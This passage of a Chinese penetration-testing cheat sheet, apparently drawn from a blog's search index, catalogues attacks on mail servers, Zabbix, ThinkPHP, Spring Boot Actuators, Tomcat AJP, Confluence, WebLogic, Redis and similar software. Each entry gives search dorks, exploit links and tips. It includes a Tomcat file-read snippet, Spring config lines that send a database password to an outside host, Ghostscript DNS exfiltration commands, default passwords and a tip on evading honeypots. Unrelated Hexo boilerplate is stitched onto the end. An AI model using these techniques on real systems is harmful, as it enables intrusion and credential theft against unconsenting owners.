漏洞分析Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客https://blog.csdn.net/god_zzZ/article/details/92735189 6. 漏洞利用 yuxiaoyou123/coremail-exphttps://github.com/yuxiaoyou123/coremail-exp dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本https://github.com/dpu/coremail-address-book 7. 利用技巧 1.这个找不到源码, 没法分析 里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码 2.这个东西有几率受到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤) 8. 防护方法 1.及时更新补丁 2.升级到最新版 Winmail 相关漏洞1. 漏洞简介 Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传 2. 影响组件Winmail 3. 漏洞指纹 Winmail 4. Fofa Dork app=\"Winmail-Server\" 5. 漏洞分析 Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.orghttp://www.91ri.org/16519.html winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术http://www.hackdig.com/06/hack-36899.htm Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.orghttps://php.mengsec.com/bugs/wooyun-2014-057890.html 6. 漏洞利用 Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.orghttp://www.91ri.org/16519.html winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术http://www.hackdig.com/06/hack-36899.htm Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.orghttps://php.mengsec.com/bugs/wooyun-2014-057890.html 7. 利用技巧 1.这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5 2.邮件系列老洞 高屋建瓴之WebMail攻与防 – cyjay5un – 博客园https://www.cnblogs.com/cyjaysun/p/4378907.html 8. 防护方法 1.及时更新补丁 2.升级到最新版 Zabbix 相关漏洞1. 漏洞简介 Zabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行 2. 影响组件 Zabbix 3. 漏洞指纹 Zabbix 4. Fofa Dork app=\"Zabbix\" 5. 漏洞分析 记一次zabbix安装及漏洞利用getshell全过程 – 先知社区https://xz.aliyun.com/t/6874 Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhanghttps://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/ 6. 漏洞利用 记一次zabbix安装及漏洞利用getshell全过程 – 先知社区https://xz.aliyun.com/t/6874 Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhanghttps://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/ 7. 利用技巧 1.这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了 2.另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事 8. 防护方法 1.设置强口令 2.尽量不要开放到公网 3.限制来源IP 4.升级到最新版 边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞1. 漏洞简介 大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主 2. 影响组件 防火墙, 网关, 路由器, VPN 3. 漏洞指纹 防火墙, 网关, 路由器, VPN 4. Fofa Dork防火墙, 网关, 路由器, VPN 的名称 5. 漏洞分析 【安全设备】常见网络安全设备默认口令|IT2021.Comhttps://www.it2021.com/security/614.html 渗透测试之各厂商防火墙登录IP、初始密码、技术支持https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA 6. 漏洞利用 【安全设备】常见网络安全设备默认口令|IT2021.Comhttps://www.it2021.com/security/614.html 渗透测试之各厂商防火墙登录IP、初始密码、技术支持https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA 7. 利用技巧 1.这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令 admin root 123456 永远的神 内网的安全平台就是个漏洞指南 8. 防护方法 1.设置强口令 2.限制来源IP 第三节Thinkphp 相关漏洞1. 漏洞简介 Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题 2. 影响组件Thinkphp 3. 漏洞指纹 Thinkphp X-Powered-By: ThinkPHP 4. Fofa Dork app=\"ThinkPHP\" 5. 漏洞分析 ThinkPHP漏洞总结 – 赛克社区http://zone.secevery.com/article/1165 挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/ ThinkPHP使用不当可能造成敏感信息泄露PHP_Fly鹏程万里-CSDN博客https://blog.csdn.net/Fly_hps/article/details/81201904 DSMall代码审计 – 安全客，安全资讯平台https://www.anquanke.com/post/id/203461 6. 漏洞利用 SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写https://github.com/Dido1960/thinkphp whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具https://github.com/whirlwind110/tphack 7. 利用技巧 1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露 2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中 3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞 DSMall代码审计 – 安全客，安全资讯平台https://www.anquanke.com/post/id/203461 8. 防护方法 1.及时更新补丁 2.升级到最新版Thinkphp 3.前置WAF进行防护 Spring 系列漏洞1. 漏洞简介 Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒 2. 影响组件Spring xxx 3. 漏洞指纹 X-Application-Context: 4. Fofa Dork app=\"Spring-Framework\" 5. 漏洞分析 Spring 框架漏洞集合 ~ Misaki’s Bloghttps://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/ Exploiting Spring Boot Actuators | Veracode bloghttps://www.veracode.com/blog/research/exploiting-spring-boot-actuators Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog[https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/](https://jianfensec.com/漏洞复现/Spring Boot Actuators配置不当导致RCE漏洞复现/) 6. 漏洞利用 mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCEhttps://github.com/mpgn/Spring-Boot-Actuator-Exploit artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloadshttps://github.com/artsploit/yaml-payload 7. 利用技巧 1.Spring Boot Actuators 相关漏洞超级好用 很多厂商一开始都不懂, 直接对外开放Spring Boot Actuators, 造成了有一段时间每个用了Spring Boot的厂商都出了问题 尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个Spring Boot启动的服务 然后子目录比如 http://123.123.123.123/admin/env , http://123.123.123.123/manager/env也都是可以出现的 /env 可以偷session, RCE /heapdump 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象 可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下 /trace /health /loggers /metrics /autoconfig /heapdump /threaddump /env /info /dump /configprops /mappings /auditevents /beans /jolokia /cloudfoundryapplication /hystrix.stream /actuator /actuator/auditevents /actuator/beans /actuator/health /actuator/conditions /actuator/configprops /actuator/env /actuator/info /actuator/loggers /actuator/heapdump /actuator/threaddump /actuator/metrics /actuator/scheduledtasks /actuator/httptrace /actuator/mappings /actuator/jolokia /actuator/hystrix.stream /monitor /monitor/auditevents /monitor/beans /monitor/health /monitor/conditions /monitor/configprops /monitor/env /monitor/info /monitor/loggers /monitor/heapdump /monitor/threaddump /monitor/metrics /monitor/scheduledtasks /monitor/httptrace /monitor/mappings /monitor/jolokia /monitor/hystrix.stream 这里通过 /env + /refresh 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作 里面就有操作空间, 很像fastjson反序列化 2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok eureka.client.serviceUrl.defaultZone=http://${somedb.password}@127.0.0.1:5000 spring.cloud.bootstrap.location=http://${somedb.password}@artsploit.com/yaml-payload.yml 3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群 eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了 8. 防护方法 1.及时更新补丁 2.开启Spring Boot Actuators权限校验 3.前置WAF进行防护 Phpstudy 后门远程代码执行1. 漏洞简介 Phpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器 2. 影响组件 Phpstudy 3. 漏洞指纹 phpStudy 探针 4. Fofa Dork app=\"phpStudy 探针\" 5. 漏洞分析 PhpStudy 后门分析https://paper.seebug.org/1044/ 6. 漏洞利用 NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp 7. 利用技巧 1.phpstudy 根目录下面有个l.php , 里面有探针, 可以作为判断条件 2.还有个/phpmyadmin目录, 一般密码都是root/root 后台mysql outfile 写 shell 就ok了 8. 防护方法 1.及时删除phpstudy 2.升级到最新版 3.不要用phpstduy搭建生产环境 Struts 系列漏洞1. 漏洞简介 Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在 2. 影响组件Struts 3. 漏洞指纹 Struts .action .do .action!xxxx struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_checkhttps://github.com/coffeehb/struts2_check/ 4. Fofa Dork app=\"Struts2\" (这个不太准) 5. 漏洞分析 Struts2代码执行漏洞整理 – 简书https://www.jianshu.com/p/d7cd8a2a992b 6. 漏洞利用 struts-scan/struts-scan.py at master · Lucifer1993/struts-scan https://github.com/Lucifer1993/struts-scan/ 7. 利用技巧 1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜 8. 防护方法 1.升级到最新版 2.不建议使用Struts Solr 系列漏洞1. 漏洞简介 Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞, 2. 影响组件 Solr 3. 漏洞指纹 Solr 4. Fofa Dork app=\"Solr\" 5. 漏洞分析 Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台https://www.freebuf.com/vuls/218730.html Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析https://paper.seebug.org/1009/ 6. 漏洞利用 veracode-research/solr-injection: Apache Solr Injection Researchhttps://github.com/veracode-research/solr-injection jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)https://github.com/jas502n/CVE-2019-12409 mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkithttps://github.com/mogwailabs/mjet 7. 利用技巧 1.看到锤就完事了, 漏洞太多了, 一片一片的 2.遇到mjet连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用socat进行流量转发, 后记里面有具体操作 8. 防护方法 1.升级到最新版 2.不要对外开放敏感端口 Tomcat 本地文件包含漏洞 (CVE-2020-1938)1. 漏洞简介 Tomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效 2. 影响组件 Apache Tomcat 6 Apache Tomcat 7 &lt; 7.0.100 Apache Tomcat 8 &lt; 8.5.51 Apache Tomcat 9 &lt; 9.0.31 3. 漏洞指纹 tomcat 8009 ajp \\x04\\x01\\xf4\\x00\\x15 4. Fofa Dork protocol=\"ajp\" 5. 漏洞分析 Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/ 6. 漏洞利用 0nise/CVE-2020-1938: CVE-2020-1938https://github.com/0nise/CVE-2020-1938 7. 利用技巧 1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了 主要代码也就这 t = Tomcat(\"127.0.0.1\", 8009) _, data = t.perform_request('/', attributes=[ {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']}, {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', \"/WEB-INF/web.xml\"]}, {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']}, ]) print('----------------------------') print(\"\".join([bytes.decode(d.data) for d in data])) 2.通过修改这里的路径可以进行Webapp切换, 默认是ROOT/, 需要切换应用就改成 /admin/ 之类的 3.通常检测的时候, 尽量保持t.perform_request('/' , 有的poc喜欢用 /addsd 这种的不存在的路径, 有些情况会读不到文件 8. 防护方法 1.升级到最新版 2.屏蔽8009端口对外开放 PHP-FPM 远程代码执行漏洞1. 漏洞简介 国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞 2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行 2. 影响组件 Nginx + FPM + PHP7 3. 漏洞指纹 Nginx PHP nextcloud 4. Fofa Dork 5. 漏洞分析 PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析https://paper.seebug.org/1063/ 6. 漏洞利用 neex/phuip-fpizdam: Exploit for CVE-2019-11043https://github.com/neex/phuip-fpizdam jas502n/CVE-2019-11043: php-fpm+Nginx RCEhttps://github.com/jas502n/CVE-2019-11043 7. 利用技巧 1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502 k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)https://github.com/k8gege/CVE-2019-11043 2.Nextcloud 这个应用的默认配置就存在漏洞 8. 防护方法 1.升级到最新版php 2.修改nginx配置 CVE-2019-3396 Confluence Wiki 远程代码执行1. 漏洞简介 Confluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行 2. 影响组件 Confluence 3. 漏洞指纹 Confluence 4. Fofa Dork app=\"Confluence\" 5. 漏洞分析 Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析https://paper.seebug.org/884/ Atlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心 Atlassian Confluence 远程代码执行漏洞分析 6. 漏洞利用 jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞https://github.com/jas502n/CVE-2019-3396 7. 利用技巧 1.本地写日志的方式getshell 这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了 这里的远程模板加载不支持http协议, 主要是classloader的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell 这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持file协议可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符 velocity比php语法要相对严格一点, 可能会报错, 而且velocity渲染的时候, 目标文件不能太大, 但是极端情况可以试一下 POC写入日志,分析一下挺简单的 GET /synchrony/heartbeat HTTP/1.1 Host: localhost:8091 这里就使用file协议包含log文件就ok POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: localhost:8090 8. 防护方法 1.升级到最新版 2.尽量不要开放到公网 3.限制来源IP Ghostscript 上传图片代码执行1. 漏洞简介 Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招 2. 影响组件 imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用 3. 漏洞指纹 .ps/.jpg/.png 4. Fofa Dork 5. 漏洞分析 ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台https://www.anquanke.com/post/id/157513 6. 漏洞利用 Exploit Database Searchhttps://www.exploit-db.com/search?q=Ghostscript vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhubhttps://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116 7. 利用技巧 1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行 dnslog 可以用 pinguname.admin.ceye.io 或 pingwhoami.admin.ceye.io 保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造 ping `whoami`.centos.admin.ceye.io` / `ping `whoami`.ubuntu.admin.ceye.io 分别命名为 centos_ps.jpg/ubuntu_ps.jpg, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的 8. 防护方法 1.升级到最新版 Jboss 相关漏洞1. 漏洞简介 JBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响 2. 影响组件 Jboss 3. 漏洞指纹 Jboss 4. Fofa Dork app=\"JBoss\" 5. 漏洞分析 打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台https://www.freebuf.com/vuls/186948.html 6. 漏洞利用 joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Toolhttps://github.com/joaomatosf/jexboss Perun/vuln/jboss at master · WyAtu/Perunhttps://github.com/WyAtu/Perun/tree/master/vuln/jboss 7. 利用技巧 1.Jboss的漏洞在内网还是相对比较常见的, 试过几次jexboss, 效果还ok 8. 防护方法 1.设置强口令 2.尽量不要开放到公网 3.限制来源IP 4.升级到最新版 Websphere 反序列化远程代码执行1. 漏洞简介 Websphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(), 近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362) 2. 影响组件 WebSphere 3. 漏洞指纹 WebSphere 8880 4. Fofa Dork app=\"IBM-WebSphere\" 5. 漏洞分析 What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区https://xz.aliyun.com/t/6394 6. 漏洞利用 java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploitshttps://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区https://xz.aliyun.com/t/6394 7. 利用技巧 1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的 Tomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区https://xz.aliyun.com/t/309 8. 防护方法 1.设置强口令 2.尽量不要开放到公网 3.限制来源IP 4.升级到最新版 Jenkins 系列漏洞1. 漏洞简介 Jenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令 2. 影响组件 Jenkins 3. 漏洞指纹 Jenkins 4. Fofa Dork app=\"Jenkins\" 5. 漏洞分析 Jenkins RCE漏洞分析汇总http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ Jenkins漏洞集合复现 ~ Misaki’s Bloghttps://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ 6. 漏洞利用 Jenkins漏洞集合复现 ~ Misaki’s Bloghttps://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破https://github.com/blackye/Jenkins gquere/pwn_jenkins: Notes about attacking Jenkins servers https://github.com/gquere/pwn_jenkins 7. 利用技巧 1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大 8. 防护方法 1.设置强口令 2.尽量不要开放到公网 3.限制来源IP 4.升级到最新版 RMI 对外开放1. 漏洞简介 Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集 通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行. 2. 影响组件 java* 3. 漏洞指纹 1098, 1099, 1090, 8901, 8902, 8903 N\\x00 rmiregistry 4. Fofa Dork protocol==\"java-rmi\" 5. 漏洞分析 RMI-反序列化 – 先知社区https://xz.aliyun.com/t/6660 6. 漏洞利用 Jenkins漏洞集合复现 ~ Misaki’s Bloghttps://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Java RMI服务远程命令执行利用_91Ri.orghttp://www.91ri.org/15276.html 7. 利用技巧 1.rmi一般在内网开放的比较多, nmap 扫描如下 nmap -v 8.8.8.8 -p1099 -sV --script=rmi* 8. 防护方法 1.设置强口令 2.尽量不要开放到公网 3.限制来源IP Weblogic T3 协议漏洞1. 漏洞简介 Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击. 2. 影响组件 Weblogic 3. 漏洞指纹 Lcom.tangosol.util.extractor.ReflectionExtractor … 4. Fofa Dork protocol==\"weblogic\" 5. 漏洞分析 相关漏洞有: CVE-2017-3248https://paper.seebug.org/333/ CVE-2018-2628[http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/](http://xxlegend.com/2018/04/18/CVE-2018-2628 简单复现和分析/) CVE-2018-2893https://www.freebuf.com/vuls/178105.html CVE-2019-2890https://paper.seebug.org/1069/ CVE-2020-2555(Oracle Coherence)https://paper.seebug.org/1141/ 除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.https://www.oracle.com/security-alerts/cpuapr2020.html 6. 漏洞利用 weblogic 漏洞扫描工具https://github.com/0xn0ne/weblogicScanner CVE-2020-2555https://github.com/Y4er/CVE-2020-2555 7. 利用技巧 1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap nmap -sV --script=weblogic-t3-info.nse -p 7001 2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用 Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.https://github.com/Bort-Millipede/WLT3Serial 8. 防护方法 1.及时更新补丁2.禁用T3协议3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源 Weblogic XMLDecoder反序列化1. 漏洞简介 2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271. 2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令. 2. 影响组件 WebLogic 10.X WebLogic 12.1.3 3. 漏洞指纹 /wls-wsat/CoordinatorPortType` `/_async/AsyncResponseService` `/_async/AsyncResponseServiceSoap12 4. Fofa Dork app=\"WebLogic-Server\" 5. 漏洞分析 （CVE-2017-3506 &amp;CVE-2017-10271）[http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/12/23/Weblogic XMLDecoder RCE分析/) CVE-2019-2725https://paper.seebug.org/909/ 6. 漏洞利用weblogicScannerhttps://github.com/0xn0ne/weblogicScanner 7. 利用技巧 1.由于nginx转发问题, 尝试这种路径, 可能有惊喜 /../wls-wsat/CoordinatorPortType11` `/../_async/AsyncResponseService 2.Weblogic 写shell有个技巧 可以通过find/grep命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的logo.png / /static/css/main.css 8. 防护方法 1.通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问； 2.删除对应war包并重启 webLogic； 3.限制源IP对应 weblogic 7001端口的访问. Weblogic IIOP1. 漏洞简介 2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行. 2. 影响组件 Oracle WebLogic Server version: 10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 and 12.2.1.4.0 3. 漏洞指纹 GIOP &amp;&amp; com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager 4. Fofa Dork app=\"WebLogic-Server\" 5. 漏洞分析 WebLogic CVE-2020-2551漏洞分析https://paper.seebug.org/1138/ 6. 漏洞利用 Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551https://github.com/Y4er/CVE-2020-2551 7. 利用技巧 漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台https://www.anquanke.com/post/id/201005 8. 防护方法 1.及时更新补丁 2.通过 Weblogic 控制台进行关闭 IIOP 协议 Redis 相关漏洞1. 漏洞简介 Redis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作 2. 影响组件 Redis 3. 漏洞指纹 6379 4. Fofa Dork app=\"Redis\" &amp;&amp; \"redis_version\" 5. 漏洞分析 Redis 基于主从复制的 RCE 利用方式https://paper.seebug.org/975/ 6. 漏洞利用 n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 7. 利用技巧 1.当Redis 权限满足写文件时 linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell 2.当Redis 权限不满足写文件时 发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞 发现Redis记录中存在AC ED这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据 8. 防护方法 1.Redis 设置强口令 2.Redis 尽量不要开放到公网 3.限制来源IP 后记1.记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台 搜索结果 – FOFA网络空间测绘系统","categories":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}],"tags":[]},{"title":"hello-world","slug":"hello-world","date":"2020-07-08T03:36:05.804Z","updated":"2020-07-29T09:41:59.931Z","comments":true,"path":"2020/07/08/hello-world/","link":"","permalink":"http://yoursite.com/2020/07/08/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new \"My New Post\" More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[{"name":"内网","slug":"内网","permalink":"http://yoursite.com/categories/%E5%86%85%E7%BD%91/"},{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"},{"name":"应急响应","slug":"应急响应","permalink":"http://yoursite.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}],"tags":[]}